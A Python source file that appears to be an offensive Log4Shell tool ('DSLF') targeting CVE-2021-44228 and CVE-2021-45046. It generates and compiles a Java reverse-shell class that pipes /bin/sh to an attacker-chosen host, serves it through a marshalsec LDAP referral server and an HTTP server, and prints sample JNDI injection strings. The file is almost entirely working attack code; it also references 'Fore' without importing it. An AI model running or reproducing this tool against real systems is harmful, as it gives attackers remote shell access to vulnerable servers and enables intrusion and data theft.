import argparse, subprocess, time, threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path
from termcolor import cprint

JAVA_INTERPRETER = './java/jdk/bin/java'
JAVA_COMPILER = './java/jdk/bin/javac'
JAVA_JAR = 'java/marshalsec-0.0.3-SNAPSHOT-all.jar'
JAVA_CLASS = 'marshalsec.jndi.LDAPRefServer'

### Check if Java SE Development Kit is installed 
def check_java() -> bool:
  exit_code = subprocess.call([JAVA_INTERPRETER, '-version', ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
  return exit_code == 0

### Generate PAYLOAD
def generate_payload(ip: str, nc_port: int) -> None:
  exploit = """
  import java.io.IOException; import java.io.InputStream; import java.io.OutputStream; import java.net.Socket;
  public class Exploit {
    public Exploit() throws Exception {
      String host="%s"; int port=%d; String cmd="/bin/sh"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
      Socket s=new Socket(host,port); InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
      OutputStream po=p.getOutputStream(),so=s.getOutputStream();
      while(!s.isClosed()) {
        while (pi.available()>0) so.write(pi.read()); while (pe.available()>0) so.write(pe.read()); while (si.available()>0) po.write(si.read());
        so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e) { }
      }; p.destroy(); s.close();
    }
  } """ % (ip, nc_port)

  cprint('[!] Generating and compiling malicious exploit', 'cyan')
  p = Path("Exploit.java")
  try:
    p.write_text(exploit)
    subprocess.run([JAVA_COMPILER, str(p)])
  except OSError as e:
    cprint(f'[!] Error while compiling malicious exploit: {e}', 'red')
    raise e

### Start LDAP Server
def ldap_server(ip: str, ldap_port: int, http_port: int) -> None:
  url = "http://{}:{}/#Exploit".format(ip, http_port)
  subprocess.run([JAVA_INTERPRETER, "-cp", JAVA_JAR, JAVA_CLASS, url, ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

### Start HTTP Server
def http_server(ip: str, http_port: int) -> None:
  httpd = HTTPServer((ip, http_port), SimpleHTTPRequestHandler)
  httpd.serve_forever()

### Start services : LDAP and HTTP Servers
def start_services(ip: str, ldap_port: int, http_port: int) -> None:
  cprint('[!] Starting LDAP server', 'cyan')
  thread1 = threading.Thread(target=ldap_server, args=(ip, ldap_port, http_port))
  thread1.start()
  time.sleep(1)

  cprint('[!] Starting HTTP server', 'cyan')
  thread2 = threading.Thread(target=http_server, args=(ip, http_port))
  thread2.start()
  time.sleep(1)
  cprint('[!] Waiting for the exploit to be downloaded', 'cyan')

def main() -> None:
  parser = argparse.ArgumentParser()
  parser.add_argument('--ip', action='store', dest='ip', required=True, help='IP address of the WEB server, the LDAP servers and the reverse shell')
  parser.add_argument('--http_port', action='store', dest='http_port', default='8000', help='TCP port of the WEB server')
  parser.add_argument('--ldap_port', action='store', dest='ldap_port', default='1389', help='TCP port of the LDAP server')
  parser.add_argument('--nc_port', action='store', dest='nc_port', default='9001', help='TCP port for the reverse shell (netcat use)')
  args = parser.parse_args()

  _ip = args.ip
  _http_port = args.http_port
  _ldap_port = args.ldap_port
  _nc_port = args.nc_port

  print('')
  cprint('[•] DSLF - (D)arth (S)ide of the (L)og4j (F)orce', 'green', attrs=['bold'])
  cprint('[•] Author: Julien GARAVET', 'green')
  cprint('[•] + Passive Callback Module aka PCM', 'green')
  cprint('[•] + Active  Callback Module aka ACM', 'green')
  cprint('[•] + Active  Scanner  Module aka ASM', 'green')
  print('')
  cprint('[*] ACM - Active Callback Module - Intels', 'green', attrs=['bold'])
  cprint('[*] CVE-2021-44228 with payload similar to ${jndi:ldap://192.168.1.242:1389/a}', 'green')
  cprint('[*] CVE-2021-45046 with payload similar to ${jndi:ldap://127.0.0.1#192.168.1.242:1389/a}', 'green')
  time.sleep(1)
  print('')
  cprint('[+] ACM - Active Callback Module - Settings', 'yellow', attrs=['bold'])
  cprint(f'[+] IP            {_ip}', 'yellow')
  cprint(f'[+] HTTP_port     {_http_port}', 'yellow')
  cprint(f'[+] LDAP_port     {_ldap_port}', 'yellow')
  cprint(f'[+] NC_port       {_nc_port}', 'yellow')
  time.sleep(2)
  print('')
  cprint('[!] ACM - Active Callback Module - Starting', 'cyan', attrs=['bold'])
  time.sleep(2)

  try:
    if not check_java():
      print(Fore.RED + '[-] Java SE Development Kit is not installed: https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html')
      raise SystemExit(1)
    generate_payload(_ip, int(_nc_port))
    time.sleep(1)
    start_services(_ip, int(_ldap_port), int(_http_port))
  except KeyboardInterrupt:
    print(Fore.RED + "user interuption")
    raise SystemExit(0)

if __name__ == "__main__":
  main()
